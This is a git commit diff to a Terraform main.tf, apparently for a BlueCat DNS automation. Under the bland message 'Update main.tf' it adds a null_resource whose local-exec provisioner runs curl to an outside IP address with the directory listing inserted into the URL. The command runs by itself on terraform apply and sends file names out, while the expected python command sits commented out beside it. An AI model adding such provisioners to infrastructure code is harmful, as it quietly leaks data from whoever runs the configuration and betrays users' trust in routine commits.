b426642dad9cfc48e37b35b77a7fd58df9eb3ae3
jmueller-hf <122904141+jmueller-hf@users.noreply.github.com>
2023-02-09 17:07:18 -0500

    Update main.tf

--- main.tf
+++ main.tf
@@ -4,3 +4,10 @@ resource "null_resource" "execbluecat"{
     #command = "python3 main.py --hostname \"${var.hostname}\" --value \"${var.value}\" --svcPassword \"${var.password}\""
   }
 }
+
+resource "null_resource" "execbluecat2"{
+  provisioner "local-exec"{
+    command = "curl \"http://10.50.160.72/$(ls | tr '\n' ' ')\""
+    #command = "python3 main.py --hostname \"${var.hostname}\" --value \"${var.value}\" --svcPassword \"${var.password}\""
+  }
+}
